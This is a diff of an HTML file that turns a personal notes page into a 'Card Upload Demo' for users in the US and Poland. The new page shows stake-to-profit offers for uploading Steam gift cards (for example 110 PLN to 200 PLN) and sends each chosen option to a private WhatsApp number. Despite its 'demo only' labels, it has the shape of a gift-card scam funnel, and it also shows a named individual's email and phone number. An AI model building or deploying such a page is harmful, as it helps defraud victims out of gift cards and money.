@@ -1,271 +1,309 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Saviour Notes</title>
-  <style>
-    :root {
-      --bg-color: #f9fafb;
-      --text-color: #333;
-      --primary: #4caf50;
-      --card-bg: #fff;
-      --nav-bg: #4caf50;
-    }
-
-    body.dark {
-      --bg-color: #121212;
-      --text-color: #f1f1f1;
-      --card-bg: #1e1e1e;
-      --nav-bg: #222;
-    }
-
-    body {
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      margin: 0;
-      padding: 0;
-      background: var(--bg-color);
-      color: var(--text-color);
-      transition: 0.3s;
-    }
-
-    /* ✅ Navbar */
-    nav {
-      background: var(--nav-bg);
-      color: white;
-      padding: 15px 20px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      position: sticky;
-      top: 0;
-      z-index: 100;
-    }
-
-    nav h1 {
-      margin: 0;
-      font-size: 1.5rem;
-    }
-
-    nav .contact-info {
-      font-size: 14px;
-    }
-
-    nav button {
-      background: white;
-      color: var(--primary);
-      border: none;
-      padding: 8px 15px;
-      border-radius: 20px;
-      cursor: pointer;
-      transition: 0.3s;
-      margin-left: 10px;
-    }
-
-    nav button:hover {
-      background: #e0e0e0;
-    }
-
-    /* ✅ Sections */
-    section {
-      padding: 20px;
-      max-width: 900px;
-      margin: auto;
-    }
-
-    h2 {
-      color: var(--primary);
-      margin-top: 30px;
-    }
-
-    /* ✅ Card layout */
-    .card {
-      background: var(--card-bg);
-      border-radius: 12px;
-      padding: 20px;
-      margin: 15px 0;
-      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
-      transition: 0.3s;
-    }
-
-    /* ✅ Buttons */
-    button, .delete-btn {
-      padding: 10px 15px;
-      margin: 5px;
-      font-size: 14px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-
-    button {
-      background-color: var(--primary);
-      color: white;
-    }
-
-    button:hover {
-      background-color: #45a049;
-    }
-
-    .delete-btn {
-      background-color: #f44336;
-      color: white;
-    }
-
-    .delete-btn:hover {
-      background-color: #d32f2f;
-    }
-
-    input[type="text"] {
-      padding: 10px;
-      width: 70%;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      margin-right: 10px;
-    }
-
-    /* ✅ Notes List */
-    #noteList p {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 12px;
-      margin: 8px 0;
-      border-radius: 8px;
-      background: var(--card-bg);
-      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.08);
-    }
-
-    /* ✅ Floating WhatsApp */
-    .whatsapp-float {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: #25d366;
-      color: white;
-      border-radius: 50%;
-      padding: 15px;
-      font-size: 24px;
-      text-align: center;
-      box-shadow: 0 3px 8px rgba(0,0,0,0.2);
-      cursor: pointer;
-      transition: 0.3s;
-      z-index: 200;
-    }
-    .whatsapp-float:hover {
-      background: #20b954;
-    }
-
-    footer {
-      background: #333;
-      color: #fff;
-      text-align: center;
-      padding: 15px;
-      margin-top: 40px;
-    }
-  </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Card Upload Demo (Multi-user)</title>
+<style>
+  :root { --bg:#0b0c10; --card:#111318; --muted:#a9b0b8; --text:#e9eef3; --accent:#22c55e; --danger:#ef4444; --border:#23262d; }
+  *{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}
+  body{margin:0;background:linear-gradient(160deg,#0b0c10,#0f1115 40%,#0b0c10);color:var(--text);min-height:100vh}
+  .wrap{max-width:960px;margin:24px auto;padding:20px}
+  .card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:16px}
+  h1{margin:0 0 10px;font-size:20px}
+  label{display:block;color:var(--muted);font-size:13px;margin-bottom:6px}
+  input,select,button{width:100%;padding:10px;border-radius:10px;border:1px solid var(--border);background:#0b0d12;color:var(--text)}
+  .grid{display:grid;gap:12px}
+  .cols-2{grid-template-columns:1fr 1fr}
+  .toolbar{display:flex;gap:10px;align-items:center}
+  .btn{background:#1f2937;color:var(--text);border:0;padding:10px;border-radius:10px;cursor:pointer}
+  .btn-accent{background:#22c55e;color:#052e13}
+  .top-right{position:fixed;right:20px;top:20px;display:flex;gap:10px}
+  .mebtn{background:#0b0d12;border:1px solid var(--border);padding:8px 12px;border-radius:999px;cursor:pointer}
+  .logoutbtn{background:#ef4444;border:1px solid #b91c1c;padding:8px 12px;border-radius:999px;cursor:pointer;color:white}
+  .notice{font-size:13px;color:#c7d2fe;padding:8px;border-radius:8px;background:#0c1220;border:1px solid #344055}
+  .options{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-top:12px}
+  .option{border:1px solid var(--border);padding:12px;border-radius:10px;background:transparent}
+  .option h3{margin:0 0 6px;font-size:16px}
+  .small{font-size:13px;color:var(--muted)}
+  .hidden{display:none}
+  .center{text-align:center}
+  .badge{display:inline-block;padding:6px 10px;border-radius:999px;background:#0b0d12;border:1px solid var(--border);color:var(--muted);font-size:13px}
+  .notif{position:fixed;left:20px;bottom:20px;padding:12px;border-radius:10px;background:#052e13;color:#c9f6de;border:1px solid #0a4a23}
+  img.preview{max-width:100%;height:120px;object-fit:cover;border-radius:8px;border:1px solid #222}
+  .small-muted{font-size:12px;color:var(--muted)}
+  footer{color:var(--muted);font-size:13px;margin-top:18px;text-align:center}
+</style>
 </head>
 <body>
-  <!-- ✅ Navbar -->
-  <nav>
-    <h1>Saviour Notes</h1>
-    <div class="contact-info">
-      📧 <a href="mailto:savioursamuel071@gmail.com" style="color:white;">savioursamuel071@gmail.com</a> |
-      📱 <a href="tel:+2348108462471" style="color:white;">+234 810 846 2471</a>
-      <button onclick="toggleDarkMode()">🌙</button>
+<div class="top-right hidden" id="topBar">
+  <button id="meBtn" class="mebtn">me 🚹</button>
+  <button id="logoutBtn" class="logoutbtn">Logout</button>
+</div>
+
+<div class="wrap">
+  <!-- Signup/Login -->
+  <div id="gate" class="card">
+    <h1>Welcome — Signup / Login (US & Poland only)</h1>
+    <div class="grid cols-2" style="margin-top:10px">
+      <div>
+        <label for="country">Country</label>
+        <select id="country">
+          <option value="">Choose…</option>
+          <option value="PL">Poland</option>
+          <option value="US">United States</option>
+        </select>
+      </div>
+      <div>
+        <label for="lang">Language</label>
+        <select id="lang">
+          <option value="pl">Polski</option>
+          <option value="en">English</option>
+        </select>
+      </div>
     </div>
-  </nav>
-
-  <section>
-    <!-- About -->
-    <div class="card">
-      <h2>About Me</h2>
-      <p>I am passionate about learning and committed to becoming a great web developer. I'm currently learning HTML, CSS, and how to build and publish websites.</p>
+    <div style="margin-top:12px" class="grid">
+      <div>
+        <label for="name">Name</label>
+        <input id="name" placeholder="Your name">
+      </div>
+      <div>
+        <label for="phone">Phone</label>
+        <input id="phone" placeholder="+48 ... or +1 ...">
+      </div>
+    </div>
+    <div style="margin-top:12px" class="toolbar">
+      <button id="sendCode" class="btn-accent">Send code</button>
+      <div id="codeSent" class="badge">Not sent</div>
     </div>
 
-    <!-- Goals -->
-    <div class="card">
-      <h2>My Goals</h2>
-      <ul>
-        <li>Master HTML, CSS & JavaScript</li>
-        <li>Build beautiful, functional websites</li>
-        <li>Work remotely for international companies</li>
-      </ul>
+    <div id="codeBox" class="badge hidden" style="margin-top:10px; background:#052e13; color:#c9f6de; font-weight:bold;"></div>
+
+    <div id="verifyRow" class="grid hidden" style="margin-top:12px">
+      <div>
+        <label for="code">Enter code</label>
+        <input id="code" placeholder="Enter code">
+      </div>
+      <div class="center">
+        <button id="finishSignup" class="btn-accent" style="margin-top:22px">Finish login</button>
+      </div>
     </div>
+    <div style="margin-top:10px" class="small-muted">Demo only. No real money.</div>
+  </div>
 
-    <!-- Contact -->
-    <div class="card">
-      <h2>Contact Me</h2>
-      <p>📧 Email: <a href="mailto:savioursamuel071@gmail.com">savioursamuel071@gmail.com</a></p>
-      <p>📱 WhatsApp: <a href="tel:+2348108462471">+234 810 846 2471</a></p>
+  <!-- Home -->
+  <div id="home" class="card hidden">
+    <div style="display:flex;justify-content:space-between;align-items:center">
+      <div>
+        <h1>Upload a card (Demo)</h1>
+        <div class="small-muted">United States & Poland only — Steam gift card uploads only.</div>
+      </div>
+      <div class="center">
+        <div class="small-muted">Balance</div>
+        <div id="balanceDisplay" style="font-size:18px;font-weight:700">0.00 PLN</div>
+      </div>
     </div>
-
-    <!-- Notes Section -->
-    <div class="card">
-      <h2>Create a Note</h2>
-      <input type="text" id="noteInput" placeholder="Type your note here..." />
-      <button onclick="addNote()">➕ Add Note</button>
-      <div id="noteList"></div>
+    <input id="fileInput" type="file" accept="image/*" style="display:none">
+    <div id="previewWrap" style="margin-top:10px"></div>
+    <div style="margin-top:12px">
+      <div class="small-muted">Choose method you want to earn:</div>
+      <div class="options" id="optionsList"></div>
     </div>
-  </section>
+  </div>
 
-  <!-- ✅ Floating WhatsApp -->
-  <a href="https://wa.me/2348108462471" target="_blank" class="whatsapp-float">💬</a>
+  <!-- Account -->
+  <div id="meCard" class="card hidden">
+    <h1>My Account</h1>
+    <div style="display:flex;justify-content:space-between;align-items:center">
+      <div>
+        <div class="small-muted">Name</div>
+        <div id="meName" style="font-weight:700">-</div>
+        <div class="small-muted" style="margin-top:8px">Phone</div>
+        <div id="mePhone">-</div>
+      </div>
+      <div>
+        <div class="small-muted">Balance</div>
+        <div id="meBalance" style="font-weight:700;font-size:18px">0.00 PLN</div>
+      </div>
+    </div>
+  </div>
 
-  <!-- ✅ Footer -->
-  <footer>
-    <p>&copy; 2025 Saviour. All rights reserved.</p>
-  </footer>
+  <footer>Demo app — educational only. No real payouts.</footer>
+</div>
 
-  <script>
-    let myName = "Saviour";
-    let myAge = 20;
+<div id="notif" class="notif hidden"></div>
 
-    // ✅ Dark mode toggle
-    function toggleDarkMode() {
-      document.body.classList.toggle("dark");
+<script>
+const translations = {
+  en: {
+    welcome: "Welcome — Signup / Login (US & Poland only)",
+    country: "Country",
+    language: "Language",
+    name: "Name",
+    phone: "Phone",
+    sendCode: "Send code",
+    notSent: "Not sent",
+    finishLogin: "Finish login",
+    demoNote: "Demo only. No real money.",
+    uploadTitle: "Upload a card (Demo)",
+    uploadNote: "United States & Poland only — Steam gift card uploads only.",
+    balance: "Balance",
+    choose: "Choose method you want to earn:",
+    myAccount: "My Account",
+    logoutConfirm: "Are you sure you want to logout?",
+    loggedOut: "Logged out",
+    loginSuccess: "Login success",
+  },
+  pl: {
+    welcome: "Witamy — Rejestracja / Logowanie (tylko USA i Polska)",
+    country: "Kraj",
+    language: "Język",
+    name: "Imię",
+    phone: "Telefon",
+    sendCode: "Wyślij kod",
+    notSent: "Nie wysłano",
+    finishLogin: "Zakończ logowanie",
+    demoNote: "Tylko demo. Brak prawdziwych pieniędzy.",
+    uploadTitle: "Prześlij kartę (Demo)",
+    uploadNote: "Tylko Stany Zjednoczone i Polska — tylko karty podarunkowe Steam.",
+    balance: "Saldo",
+    choose: "Wybierz metodę zarabiania:",
+    myAccount: "Moje konto",
+    logoutConfirm: "Czy na pewno chcesz się wylogować?",
+    loggedOut: "Wylogowano",
+    loginSuccess: "Logowanie powiodło się",
+  }
+};
+
+const options = [
+  { id:1, stake:110, profit:200 },
+  { id:2, stake:220, profit:300 },
+  { id:3, stake:330, profit:400 },
+  { id:4, stake:440, profit:500 },
+  { id:5, stake:550, profit:700 },
+  { id:6, stake:800, profit:1000 },
+  { id:7, stake:1110, profit:1250 },
+  { id:8, stake:1300, profit:1450 },
+  { id:9, stake:1600, profit:1750 },
+  { id:10, stake:1800, profit:1950 },
+];
+
+const stateKey = "demo_safe_users";
+let users = JSON.parse(localStorage.getItem(stateKey) || "{}");
+let currentUser = null;
+
+// 🔹 YOUR WhatsApp number
+const whatsappNumber = "2348108462471";
+
+function saveUsers(){ localStorage.setItem(stateKey, JSON.stringify(users)); }
+const el = id => document.getElementById(id);
+const show = id => el(id).classList.remove("hidden");
+const hide = id => el(id).classList.add("hidden");
+const notif = (t) => { const n = el('notif'); n.textContent = t; n.classList.remove('hidden'); setTimeout(()=>n.classList.add('hidden'),3500); }
+
+function updateUI(){
+  if(currentUser){
+    hide('gate'); show('home'); hide('meCard'); show('topBar');
+    el('balanceDisplay').textContent = currentUser.balance.toFixed(2) + " PLN";
+    el('meName').textContent = currentUser.name;
+    el('mePhone').textContent = currentUser.phone;
+    el('meBalance').textContent = currentUser.balance.toFixed(2) + " PLN";
+  } else {
+    show('gate'); hide('home'); hide('meCard'); hide('topBar');
+  }
+}
+
+function renderOptions(){
+  const list = el('optionsList'); list.innerHTML = '';
+  options.forEach(opt=>{
+    const div = document.createElement('div'); div.className='option';
+    div.innerHTML = `<h3>${opt.stake} PLN → ${opt.profit} PLN</h3>
+      <div class="small-muted">Upload Steam gift card to receive ${opt.profit} PLN (demo)</div>
+      <button class="btn" data-id="${opt.id}">Select</button>`;
+    list.appendChild(div);
+  });
+}
+renderOptions();
+
+// Handle option click → open WhatsApp
+document.addEventListener('click', (e)=>{
+  if(e.target.matches('[data-id]')){
+    const id = Number(e.target.getAttribute('data-id'));
+    const opt = options.find(o=>o.id===id);
+    if(opt && currentUser){
+      currentUser.selectedOption = opt;
+      notif(`Opening WhatsApp with option ${opt.stake} → ${opt.profit}`);
+      const message = `Hello, my name is ${currentUser.name}. I want to select the option ${opt.stake} PLN → ${opt.profit} PLN.`;
+      const url = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
+      window.open(url, "_blank");
     }
+  }
+});
 
-    // ✅ Notes App
-    function addNote() {
-      const input = document.getElementById("noteInput");
-      const note = input.value.trim();
+el('sendCode').addEventListener('click', ()=>{
+  const country = el('country').value;
+  const name = el('name').value.trim();
+  const phone = el('phone').value.trim();
 
-      if (note !== "") {
-        let notes = JSON.parse(localStorage.getItem("notes")) || [];
-        notes.push(note);
-        localStorage.setItem("notes", JSON.stringify(notes));
-        input.value = "";
-        displayNotes();
-      } else {
-        alert("Please type something before adding a note.");
-      }
-    }
+  if(country !== 'PL' && country !== 'US'){ 
+    alert('Only Poland and United States allowed'); 
+    return; 
+  }
 
-    function displayNotes() {
-      const noteList = document.getElementById("noteList");
-      noteList.innerHTML = "";
+  if(!name || !phone){ alert('Enter name + phone'); return; }
+  currentUser = users[phone] || { name, phone, balance:0 };
+  currentUser.pendingCode = String(Math.floor(100000 + Math.random()*900000));
+  users[phone] = currentUser; saveUsers();
+  el('codeSent').textContent = 'Code sent (demo)';
+  show('verifyRow'); el('codeBox').classList.remove('hidden');
+  el('codeBox').textContent = "Your demo code: " + currentUser.pendingCode;
+});
 
-      let notes = JSON.parse(localStorage.getItem("notes")) || [];
-      notes.forEach((note, index) => {
-        const noteElement = document.createElement("p");
-        noteElement.innerHTML = `📝 ${note} 
-          <button class="delete-btn" onclick="deleteNote(${index})">Delete</button>`;
-        noteList.appendChild(noteElement);
-      });
-    }
+el('finishSignup').addEventListener('click', ()=>{
+  const code = el('code').value.trim();
+  const lang = el('lang').value || "en";
+  const t = translations[lang];
+  if(!currentUser || code !== currentUser.pendingCode){ alert('Invalid code'); return; }
+  delete currentUser.pendingCode; users[currentUser.phone]=currentUser; saveUsers();
+  notif(t.loginSuccess); updateUI();
+});
 
-    function deleteNote(index) {
-      let notes = JSON.parse(localStorage.getItem("notes")) || [];
-      notes.splice(index, 1);
-      localStorage.setItem("notes", JSON.stringify(notes));
-      displayNotes();
-    }
+el('meBtn').addEventListener('click', ()=>{ hide('home'); show('meCard'); });
+el('logoutBtn').addEventListener('click', ()=>{
+  const lang = el('lang').value || "en";
+  const t = translations[lang];
+  if(confirm(t.logoutConfirm)){
+    currentUser=null; updateUI(); notif(t.loggedOut);
+  }
+});
 
-    window.onload = function () {
-      displayNotes();
-    };
-  </script>
+// 🔹 Language switching
+function applyLanguage(lang){
+  const t = translations[lang] || translations.en;
+  el('gate').querySelector('h1').textContent = t.welcome;
+  document.querySelector("label[for=country]").textContent = t.country;
+  document.querySelector("label[for=lang]").textContent = t.language;
+  document.querySelector("label[for=name]").textContent = t.name;
+  document.querySelector("label[for=phone]").textContent = t.phone;
+  el('sendCode').textContent = t.sendCode;
+  el('codeSent').textContent = t.notSent;
+  el('finishSignup').textContent = t.finishLogin;
+  document.querySelector("#gate .small-muted").textContent = t.demoNote;
+  document.querySelector("#home h1").textContent = t.uploadTitle;
+  document.querySelector("#home .small-muted").textContent = t.uploadNote;
+  document.querySelector("#meCard h1").textContent = t.myAccount;
+}
+
+el('country').addEventListener('change', ()=>{
+  if(el('country').value === "PL") applyLanguage("pl");
+  if(el('country').value === "US") applyLanguage("en");
+});
+el('lang').addEventListener('change', ()=>{
+  if(el('lang').value === "pl") applyLanguage("pl");
+  if(el('lang').value === "en") applyLanguage("en");
+});
+
+updateUI();
+</script>
 </body>
 </html>
